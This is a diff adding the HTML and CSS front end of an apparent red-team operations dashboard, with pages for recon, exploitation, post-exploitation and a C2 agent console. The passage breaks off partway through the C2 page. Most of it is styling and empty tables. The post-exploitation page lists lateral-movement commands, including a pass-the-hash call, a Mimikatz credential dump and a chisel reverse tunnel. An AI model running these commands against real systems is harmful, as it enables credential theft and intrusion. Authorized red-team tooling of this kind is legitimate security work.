@@ -1,0 +1,1741 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Red Team Framework — Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red: #e63946;
+    --red-dim: #7a1a1a;
+    --green: #00ff88;
+    --green-dim: #004d2a;
+    --yellow: #ffd166;
+    --blue: #4cc9f0;
+    --bg: #080a0e;
+    --bg2: #0d1117;
+    --bg3: #161b22;
+    --bg4: #1c2333;
+    --border: #21262d;
+    --text: #c9d1d9;
+    --text-dim: #484f58;
+    --mono: 'Share Tech Mono', monospace;
+    --sans: 'Rajdhani', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.03) 2px,
+      rgba(0,0,0,0.03) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* Noise texture */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 9998;
+    opacity: 0.4;
+  }
+
+  /* TOP BAR */
+  .topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 24px;
+    height: 52px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .topbar-left {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .logo-icon {
+    width: 28px; height: 28px;
+    background: var(--red);
+    clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+    animation: pulse-logo 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse-logo {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.6; }
+  }
+
+  .logo-text {
+    font-family: var(--sans);
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: #fff;
+  }
+
+  .logo-text span { color: var(--red); }
+
+  .topbar-status {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 12px;
+    color: var(--green);
+  }
+
+  .status-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--green);
+    animation: blink 1.5s ease-in-out infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.2; }
+  }
+
+  .topbar-right {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    font-size: 12px;
+    color: var(--text-dim);
+  }
+
+  .topbar-time { color: var(--yellow); }
+
+  /* LAYOUT */
+  .layout {
+    display: grid;
+    grid-template-columns: 220px 1fr;
+    min-height: calc(100vh - 52px);
+  }
+
+  /* SIDEBAR */
+  .sidebar {
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    padding: 20px 0;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+
+  .sidebar-section {
+    padding: 6px 16px 4px;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-top: 8px;
+  }
+
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 9px 20px;
+    cursor: pointer;
+    font-size: 13px;
+    color: var(--text-dim);
+    border-left: 2px solid transparent;
+    transition: all 0.15s;
+    text-decoration: none;
+  }
+
+  .nav-item:hover {
+    color: var(--text);
+    background: var(--bg3);
+    border-left-color: var(--red-dim);
+  }
+
+  .nav-item.active {
+    color: var(--red);
+    background: rgba(230,57,70,0.08);
+    border-left-color: var(--red);
+  }
+
+  .nav-item .nav-icon { font-size: 14px; width: 16px; text-align: center; }
+
+  .nav-badge {
+    margin-left: auto;
+    background: var(--red);
+    color: #fff;
+    font-size: 10px;
+    padding: 1px 6px;
+    border-radius: 10px;
+    min-width: 18px;
+    text-align: center;
+  }
+
+  .nav-badge.green { background: var(--green-dim); color: var(--green); }
+  .nav-badge.yellow { background: #3d2e00; color: var(--yellow); }
+
+  /* MAIN CONTENT */
+  .main {
+    padding: 24px;
+    overflow-y: auto;
+  }
+
+  /* PAGE HEADER */
+  .page-header {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    margin-bottom: 24px;
+  }
+
+  .page-title {
+    font-family: var(--sans);
+    font-size: 26px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    color: #fff;
+  }
+
+  .page-subtitle {
+    font-size: 12px;
+    color: var(--text-dim);
+    margin-top: 4px;
+  }
+
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    padding: 8px 18px;
+    font-family: var(--mono);
+    font-size: 13px;
+    border: none;
+    cursor: pointer;
+    transition: all 0.15s;
+    letter-spacing: 0.5px;
+  }
+
+  .btn-red {
+    background: var(--red);
+    color: #fff;
+    clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
+  }
+
+  .btn-red:hover { background: #c1121f; transform: translateY(-1px); }
+
+  .btn-outline {
+    background: transparent;
+    color: var(--text);
+    border: 1px solid var(--border);
+  }
+
+  .btn-outline:hover { border-color: var(--red); color: var(--red); }
+
+  /* STATS GRID */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+
+  .stat-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 18px 20px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .stat-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+    background: var(--accent, var(--red));
+  }
+
+  .stat-card:hover { border-color: var(--accent, var(--red)); }
+
+  .stat-label {
+    font-size: 11px;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 10px;
+  }
+
+  .stat-value {
+    font-family: var(--sans);
+    font-size: 36px;
+    font-weight: 700;
+    color: var(--accent, var(--red));
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+
+  .stat-meta {
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .stat-meta span { color: var(--green); }
+
+  /* GRID 2-COL */
+  .grid-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    margin-bottom: 16px;
+  }
+
+  .grid-3 {
+    display: grid;
+    grid-template-columns: 2fr 1fr;
+    gap: 16px;
+    margin-bottom: 16px;
+  }
+
+  /* PANEL */
+  .panel {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+  }
+
+  .panel-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    font-size: 12px;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+  }
+
+  .panel-header-left {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .panel-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--red);
+  }
+
+  .panel-dot.green { background: var(--green); }
+  .panel-dot.yellow { background: var(--yellow); }
+  .panel-dot.blue { background: var(--blue); }
+
+  .panel-body { padding: 16px; }
+
+  /* TERMINAL */
+  .terminal {
+    background: #020408;
+    border: 1px solid var(--border);
+    padding: 14px 16px;
+    font-size: 12px;
+    line-height: 1.8;
+    max-height: 280px;
+    overflow-y: auto;
+  }
+
+  .terminal::-webkit-scrollbar { width: 4px; }
+  .terminal::-webkit-scrollbar-track { background: transparent; }
+  .terminal::-webkit-scrollbar-thumb { background: var(--border); }
+
+  .t-line { display: flex; gap: 10px; }
+  .t-time { color: var(--text-dim); min-width: 60px; }
+  .t-prompt { color: var(--red); }
+  .t-cmd { color: var(--green); }
+  .t-out { color: var(--text); }
+  .t-warn { color: var(--yellow); }
+  .t-err { color: var(--red); }
+  .t-info { color: var(--blue); }
+
+  .terminal-input {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 8px;
+    padding-top: 8px;
+    border-top: 1px solid var(--border);
+  }
+
+  .terminal-input span { color: var(--red); font-size: 12px; }
+
+  .terminal-input input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--green);
+    font-family: var(--mono);
+    font-size: 12px;
+    caret-color: var(--green);
+  }
+
+  /* PHASE PIPELINE */
+  .pipeline {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    margin-bottom: 24px;
+  }
+
+  .phase-step {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    position: relative;
+  }
+
+  .phase-step:not(:last-child)::after {
+    content: '';
+    position: absolute;
+    top: 18px;
+    right: -50%;
+    width: 100%;
+    height: 2px;
+    background: var(--border);
+    z-index: 0;
+  }
+
+  .phase-step.done:not(:last-child)::after { background: var(--green-dim); }
+  .phase-step.active:not(:last-child)::after { background: var(--red-dim); }
+
+  .phase-circle {
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    border: 2px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    background: var(--bg2);
+    position: relative;
+    z-index: 1;
+  }
+
+  .phase-step.done .phase-circle {
+    border-color: var(--green);
+    background: var(--green-dim);
+    color: var(--green);
+  }
+
+  .phase-step.active .phase-circle {
+    border-color: var(--red);
+    background: rgba(230,57,70,0.15);
+    animation: pulse-ring 1.5s ease-in-out infinite;
+  }
+
+  @keyframes pulse-ring {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(230,57,70,0.4); }
+    50% { box-shadow: 0 0 0 8px rgba(230,57,70,0); }
+  }
+
+  .phase-label {
+    font-size: 11px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+  }
+
+  .phase-step.done .phase-label { color: var(--green); }
+  .phase-step.active .phase-label { color: var(--red); }
+
+  /* TABLE */
+  .rtable {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+
+  .rtable th {
+    text-align: left;
+    padding: 8px 12px;
+    font-size: 10px;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    border-bottom: 1px solid var(--border);
+    font-weight: normal;
+  }
+
+  .rtable td {
+    padding: 9px 12px;
+    border-bottom: 1px solid rgba(33,38,45,0.5);
+    vertical-align: middle;
+  }
+
+  .rtable tr:hover td { background: rgba(255,255,255,0.02); }
+
+  /* BADGE */
+  .badge {
+    display: inline-block;
+    padding: 2px 8px;
+    font-size: 10px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    font-weight: bold;
+  }
+
+  .badge-critical { background: rgba(230,57,70,0.2); color: var(--red); border: 1px solid var(--red-dim); }
+  .badge-high { background: rgba(255,100,0,0.15); color: #ff6400; border: 1px solid #7a3000; }
+  .badge-medium { background: rgba(255,209,102,0.1); color: var(--yellow); border: 1px solid #5a4500; }
+  .badge-low { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid var(--green-dim); }
+  .badge-open { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid var(--green-dim); }
+  .badge-info { background: rgba(76,201,240,0.1); color: var(--blue); border: 1px solid #1a4a5a; }
+
+  /* AGENT CARD */
+  .agent-list { display: flex; flex-direction: column; gap: 8px; }
+
+  .agent-card {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 14px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .agent-card:hover { border-color: var(--red); background: rgba(230,57,70,0.05); }
+
+  .agent-indicator {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 6px var(--green);
+    flex-shrink: 0;
+  }
+
+  .agent-indicator.offline { background: var(--text-dim); box-shadow: none; }
+
+  .agent-info { flex: 1; }
+  .agent-id { font-size: 13px; color: var(--green); }
+  .agent-meta { font-size: 11px; color: var(--text-dim); margin-top: 2px; }
+
+  .agent-actions { display: flex; gap: 6px; }
+
+  .btn-xs {
+    padding: 4px 10px;
+    font-family: var(--mono);
+    font-size: 11px;
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .btn-xs:hover { border-color: var(--red); color: var(--red); }
+  .btn-xs.green:hover { border-color: var(--green); color: var(--green); }
+
+  /* PROGRESS BAR */
+  .progress-item {
+    margin-bottom: 14px;
+  }
+
+  .progress-header {
+    display: flex;
+    justify-content: space-between;
+    font-size: 12px;
+    margin-bottom: 6px;
+    color: var(--text-dim);
+  }
+
+  .progress-header span:last-child { color: var(--text); }
+
+  .progress-track {
+    height: 4px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: var(--fill-color, var(--red));
+    transition: width 1s ease;
+    position: relative;
+  }
+
+  .progress-fill::after {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 20px; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4));
+    animation: shimmer 1.5s ease-in-out infinite;
+  }
+
+  @keyframes shimmer {
+    0% { opacity: 0; }
+    50% { opacity: 1; }
+    100% { opacity: 0; }
+  }
+
+  /* MINI CHART */
+  .sparkline {
+    display: flex;
+    align-items: flex-end;
+    gap: 3px;
+    height: 40px;
+  }
+
+  .spark-bar {
+    flex: 1;
+    background: var(--red-dim);
+    border-top: 1px solid var(--red);
+    transition: height 0.3s ease;
+    min-width: 4px;
+  }
+
+  .spark-bar:hover { background: var(--red); }
+
+  /* FINDING ITEM */
+  .finding-item {
+    display: flex;
+    gap: 12px;
+    padding: 10px 0;
+    border-bottom: 1px solid rgba(33,38,45,0.6);
+  }
+
+  .finding-item:last-child { border-bottom: none; }
+
+  .finding-sev { flex-shrink: 0; padding-top: 2px; }
+  .finding-title { font-size: 13px; color: var(--text); margin-bottom: 3px; }
+  .finding-meta { font-size: 11px; color: var(--text-dim); }
+
+  /* SCROLLBAR */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); }
+  ::-webkit-scrollbar-thumb:hover { background: var(--red-dim); }
+
+  /* ANIMATE IN */
+  .fade-in {
+    animation: fadeIn 0.4s ease forwards;
+    opacity: 0;
+  }
+
+  @keyframes fadeIn {
+    to { opacity: 1; transform: translateY(0); }
+    from { opacity: 0; transform: translateY(8px); }
+  }
+
+  .fade-in:nth-child(1) { animation-delay: 0.05s; }
+  .fade-in:nth-child(2) { animation-delay: 0.1s; }
+  .fade-in:nth-child(3) { animation-delay: 0.15s; }
+  .fade-in:nth-child(4) { animation-delay: 0.2s; }
+
+  /* TYPING CURSOR */
+  .cursor {
+    display: inline-block;
+    width: 8px; height: 14px;
+    background: var(--green);
+    animation: blink-cursor 1s step-end infinite;
+    vertical-align: text-bottom;
+  }
+
+  @keyframes blink-cursor {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  /* RUN BUTTON GLOW */
+  .btn-glow {
+    box-shadow: 0 0 20px rgba(230,57,70,0.3);
+  }
+
+  .btn-glow:hover {
+    box-shadow: 0 0 30px rgba(230,57,70,0.5);
+  }
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <div class="topbar-left">
+    <div class="logo">
+      <div class="logo-icon"></div>
+      <div class="logo-text">RED<span>TEAM</span> FRAMEWORK</div>
+    </div>
+  </div>
+  <div class="topbar-status">
+    <div class="status-dot"></div>
+    SYSTEM OPERATIONAL
+  </div>
+  <div class="topbar-right">
+    <span>TARGET: <span style="color:var(--red)" id="target-display">NOT SET</span></span>
+    <span class="topbar-time" id="clock">--:--:--</span>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="layout">
+
+  <!-- SIDEBAR -->
+  <nav class="sidebar">
+    <div class="sidebar-section">Navigation</div>
+    <a class="nav-item active" onclick="showPage('overview')">
+      <span class="nav-icon">⬡</span> Overview
+    </a>
+    <a class="nav-item" onclick="showPage('recon')">
+      <span class="nav-icon">◈</span> Recon
+      <span class="nav-badge green" id="badge-recon">0</span>
+    </a>
+    <a class="nav-item" onclick="showPage('exploit')">
+      <span class="nav-icon">◉</span> Exploitation
+      <span class="nav-badge" id="badge-exploit">0</span>
+    </a>
+    <a class="nav-item" onclick="showPage('postexploit')">
+      <span class="nav-icon">◎</span> Post-Exploit
+      <span class="nav-badge yellow" id="badge-post">0</span>
+    </a>
+
+    <div class="sidebar-section">Infrastructure</div>
+    <a class="nav-item" onclick="showPage('c2')">
+      <span class="nav-icon">▣</span> C2 Console
+      <span class="nav-badge green" id="badge-agents">0</span>
+    </a>
+    <a class="nav-item" onclick="showPage('payloads')">
+      <span class="nav-icon">▷</span> Payloads
+    </a>
+
+    <div class="sidebar-section">Output</div>
+    <a class="nav-item" onclick="showPage('report')">
+      <span class="nav-icon">▤</span> Report
+    </a>
+    <a class="nav-item" onclick="showPage('settings')">
+      <span class="nav-icon">◧</span> Settings
+    </a>
+  </nav>
+
+  <!-- MAIN -->
+  <main class="main" id="main-content">
+
+    <!-- OVERVIEW PAGE -->
+    <div id="page-overview">
+      <div class="page-header">
+        <div>
+          <div class="page-title">MISSION OVERVIEW</div>
+          <div class="page-subtitle">Real-time red team operation status</div>
+        </div>
+        <div style="display:flex;gap:10px">
+          <button class="btn btn-outline" onclick="loadResults()">↺ REFRESH</button>
+          <button class="btn btn-red btn-glow" onclick="runFullScan()">▶ RUN ASSESSMENT</button>
+        </div>
+      </div>
+
+      <!-- PIPELINE -->
+      <div class="pipeline">
+        <div class="phase-step done" id="phase-recon">
+          <div class="phase-circle">✓</div>
+          <div class="phase-label">Recon</div>
+        </div>
+        <div class="phase-step done" id="phase-exploit">
+          <div class="phase-circle">✓</div>
+          <div class="phase-label">Exploit</div>
+        </div>
+        <div class="phase-step active" id="phase-post">
+          <div class="phase-circle">3</div>
+          <div class="phase-label">Post-Exploit</div>
+        </div>
+        <div class="phase-step" id="phase-c2">
+          <div class="phase-circle">4</div>
+          <div class="phase-label">C2</div>
+        </div>
+        <div class="phase-step" id="phase-report">
+          <div class="phase-circle">5</div>
+          <div class="phase-label">Report</div>
+        </div>
+      </div>
+
+      <!-- STATS -->
+      <div class="stats-grid">
+        <div class="stat-card fade-in" style="--accent:var(--green)">
+          <div class="stat-label">Subdomains Found</div>
+          <div class="stat-value" id="stat-subdomains">0</div>
+          <div class="stat-meta">from recon phase</div>
+        </div>
+        <div class="stat-card fade-in" style="--accent:var(--blue)">
+          <div class="stat-label">Open Ports</div>
+          <div class="stat-value" id="stat-ports">0</div>
+          <div class="stat-meta">services detected</div>
+        </div>
+        <div class="stat-card fade-in">
+          <div class="stat-label">CVEs Found</div>
+          <div class="stat-value" id="stat-cves">0</div>
+          <div class="stat-meta">vulnerabilities</div>
+        </div>
+        <div class="stat-card fade-in" style="--accent:var(--yellow)">
+          <div class="stat-label">Exposed Dirs</div>
+          <div class="stat-value" id="stat-dirs">0</div>
+          <div class="stat-meta">web paths found</div>
+        </div>
+      </div>
+
+      <div class="grid-3">
+        <!-- LIVE TERMINAL -->
+        <div class="panel">
+          <div class="panel-header">
+            <div class="panel-header-left">
+              <div class="panel-dot"></div>
+              LIVE OUTPUT
+            </div>
+            <span style="cursor:pointer;color:var(--red)" onclick="clearTerminal()">CLEAR</span>
+          </div>
+          <div class="terminal" id="main-terminal">
+            <div class="t-line"><span class="t-time">00:00:00</span><span class="t-prompt">RTF $</span><span class="t-cmd">Red Team Framework initialized</span></div>
+            <div class="t-line"><span class="t-time">00:00:01</span><span class="t-info">[*]</span><span class="t-out">Loading modules: recon, exploitation, post_exploit, c2, reporting</span></div>
+            <div class="t-line"><span class="t-time">00:00:01</span><span class="t-cmd">[+]</span><span class="t-out">All modules loaded successfully</span></div>
+            <div class="t-line"><span class="t-time">00:00:02</span><span class="t-info">[*]</span><span class="t-out">Dashboard ready. Configure target in Settings.</span></div>
+            <div class="t-line"><span class="t-time">00:00:02</span><span class="t-prompt">RTF $</span><span class="cursor"></span></div>
+          </div>
+          <div class="terminal-input">
+            <span>RTF $</span>
+            <input type="text" id="cmd-input" placeholder="enter command..." onkeydown="handleCmd(event)">
+          </div>
+        </div>
+
+        <!-- RISK OVERVIEW -->
+        <div class="panel">
+          <div class="panel-header">
+            <div class="panel-header-left">
+              <div class="panel-dot yellow"></div>
+              RISK SCORE
+            </div>
+          </div>
+          <div class="panel-body">
+            <div style="text-align:center;padding:10px 0 16px">
+              <div style="font-family:var(--sans);font-size:64px;font-weight:700;color:var(--yellow);line-height:1" id="risk-score">--</div>
+              <div style="font-size:11px;color:var(--text-dim);letter-spacing:2px;margin-top:4px">RISK SCORE</div>
+            </div>
+            <div class="progress-item">
+              <div class="progress-header"><span>Critical</span><span id="prog-critical">0</span></div>
+              <div class="progress-track"><div class="progress-fill" id="fill-critical" style="width:0%;--fill-color:var(--red)"></div></div>
+            </div>
+            <div class="progress-item">
+              <div class="progress-header"><span>High</span><span id="prog-high">0</span></div>
+              <div class="progress-track"><div class="progress-fill" id="fill-high" style="width:0%;--fill-color:#ff6400"></div></div>
+            </div>
+            <div class="progress-item">
+              <div class="progress-header"><span>Medium</span><span id="prog-medium">0</span></div>
+              <div class="progress-track"><div class="progress-fill" id="fill-medium" style="width:0%;--fill-color:var(--yellow)"></div></div>
+            </div>
+            <div class="progress-item">
+              <div class="progress-header"><span>Low</span><span id="prog-low">0</span></div>
+              <div class="progress-track"><div class="progress-fill" id="fill-low" style="width:0%;--fill-color:var(--green)"></div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- FINDINGS TABLE -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-header-left">
+            <div class="panel-dot"></div>
+            LATEST FINDINGS
+          </div>
+          <span style="font-size:11px" id="findings-count">0 findings</span>
+        </div>
+        <div class="panel-body" style="padding:0">
+          <table class="rtable">
+            <thead>
+              <tr>
+                <th>Severity</th>
+                <th>Finding</th>
+                <th>Location</th>
+                <th>CVE / ID</th>
+                <th>Score</th>
+              </tr>
+            </thead>
+            <tbody id="findings-tbody">
+              <tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No findings yet. Run assessment to populate.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- RECON PAGE -->
+    <div id="page-recon" style="display:none">
+      <div class="page-header">
+        <div>
+          <div class="page-title">RECONNAISSANCE</div>
+          <div class="page-subtitle">OSINT, subdomain enumeration, port scanning</div>
+        </div>
+        <button class="btn btn-red" onclick="runPhase('recon')">▶ RUN RECON</button>
+      </div>
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot green"></div>SUBDOMAINS</div><span id="sub-count">0 found</span></div>
+          <div class="panel-body" style="padding:0;max-height:300px;overflow-y:auto">
+            <table class="rtable">
+              <thead><tr><th>Subdomain</th><th>Status</th></tr></thead>
+              <tbody id="subdomain-tbody"><tr><td colspan="2" style="text-align:center;padding:20px;color:var(--text-dim)">Run recon to enumerate</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot blue"></div>OPEN PORTS</div><span id="port-count">0 found</span></div>
+          <div class="panel-body" style="padding:0">
+            <table class="rtable">
+              <thead><tr><th>Port</th><th>Service</th><th>Version</th><th>State</th></tr></thead>
+              <tbody id="ports-tbody"><tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-dim)">Run recon to scan ports</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header"><div class="panel-header-left"><div class="panel-dot yellow"></div>SHODAN INTEL</div></div>
+        <div class="panel-body">
+          <div id="shodan-data" style="font-size:13px;color:var(--text-dim)">No Shodan data. Run recon with API key configured.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- EXPLOIT PAGE -->
+    <div id="page-exploit" style="display:none">
+      <div class="page-header">
+        <div>
+          <div class="page-title">EXPLOITATION</div>
+          <div class="page-subtitle">CVE scanning, payload generation, web attacks</div>
+        </div>
+        <button class="btn btn-red" onclick="runPhase('exploit')">▶ RUN EXPLOIT</button>
+      </div>
+      <div class="panel" style="margin-bottom:16px">
+        <div class="panel-header"><div class="panel-header-left"><div class="panel-dot"></div>CVE VULNERABILITIES</div><span id="cve-count">0 found</span></div>
+        <div class="panel-body" style="padding:0">
+          <table class="rtable">
+            <thead><tr><th>CVE ID</th><th>Service</th><th>Severity</th><th>Score</th><th>Description</th></tr></thead>
+            <tbody id="cve-tbody"><tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">Run exploitation phase to scan for CVEs</td></tr></tbody>
+          </table>
+        </div>
+      </div>
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot yellow"></div>GENERATED PAYLOADS</div></div>
+          <div class="panel-body">
+            <div id="payloads-list" style="font-size:12px;color:var(--text-dim)">Run exploitation to generate payloads</div>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot blue"></div>WEB FINDINGS</div></div>
+          <div class="panel-body" style="padding:0">
+            <table class="rtable">
+              <thead><tr><th>Status</th><th>URL</th></tr></thead>
+              <tbody id="dirs-tbody"><tr><td colspan="2" style="text-align:center;padding:20px;color:var(--text-dim)">No web findings</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- POST EXPLOIT PAGE -->
+    <div id="page-postexploit" style="display:none">
+      <div class="page-header">
+        <div>
+          <div class="page-title">POST-EXPLOITATION</div>
+          <div class="page-subtitle">PrivEsc, persistence, lateral movement</div>
+        </div>
+        <button class="btn btn-red" onclick="runPhase('postexploit')">▶ RUN POST-EXPLOIT</button>
+      </div>
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot"></div>SUID BINARIES</div><span id="suid-count">0 found</span></div>
+          <div class="panel-body" style="padding:0">
+            <table class="rtable">
+              <thead><tr><th>Binary</th><th>Exploit Command</th></tr></thead>
+              <tbody id="suid-tbody"><tr><td colspan="2" style="text-align:center;padding:20px;color:var(--text-dim)">Run post-exploit to check</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot yellow"></div>CRON JOBS</div></div>
+          <div class="panel-body">
+            <div id="cron-list" style="font-size:12px;color:var(--text-dim)">Run post-exploit to enumerate cron jobs</div>
+          </div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header"><div class="panel-header-left"><div class="panel-dot blue"></div>LATERAL MOVEMENT TECHNIQUES</div></div>
+        <div class="panel-body" style="padding:0">
+          <table class="rtable">
+            <thead><tr><th>Technique</th><th>Command</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td><span class="badge badge-critical">PTH</span></td><td style="color:var(--yellow);font-size:11px">pth-winexe -U domain/user%hash //target cmd.exe</td><td style="color:var(--text-dim)">Pass the Hash</td></tr>
+              <tr><td><span class="badge badge-high">SSH</span></td><td style="color:var(--yellow);font-size:11px">ssh -L 8080:internal:80 user@pivot</td><td style="color:var(--text-dim)">SSH Tunneling</td></tr>
+              <tr><td><span class="badge badge-medium">MIMI</span></td><td style="color:var(--yellow);font-size:11px">sekurlsa::logonpasswords</td><td style="color:var(--text-dim)">Mimikatz Cred Dump</td></tr>
+              <tr><td><span class="badge badge-info">CHSL</span></td><td style="color:var(--yellow);font-size:11px">chisel server -p 9000 --reverse</td><td style="color:var(--text-dim)">Chisel Tunnel</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- C2 PAGE -->
+    <div id="page-c2" style="display:none">
+      <div class="page-header">
+        <div>
+          <div class="page-title">C2 CONSOLE</div>
+          <div class="page-subtitle">Command & Control agent management</div>
+        </div>
+        <button class="btn btn-red" onclick="refreshAgents()">↺ REFRESH AGENTS</button>
+      </div>
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot green"></div>CONNECTED AGENTS</div><span id="agent-count-label">0 active</span></div>
+          <div class="panel-body">
+            <div class="agent-list" id="agent-list">
+              <div style="text-align:center;padding:24px;color:var(--text-dim);font-size:12px">
+                No agents connected.<br>Start C2 server and deploy agent.
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot"></div>AGENT SHELL</div><span id="active-agent-label" style="color:var(--red)">NO AGENT</span></div>
+          <div class="terminal" id="agent-terminal" style="max-height:220px">
+            <div class="t-line"><span class="t-info">[*]</span><span class="t-out">Select an agent to start interactive shell</span></div>
+          </div>
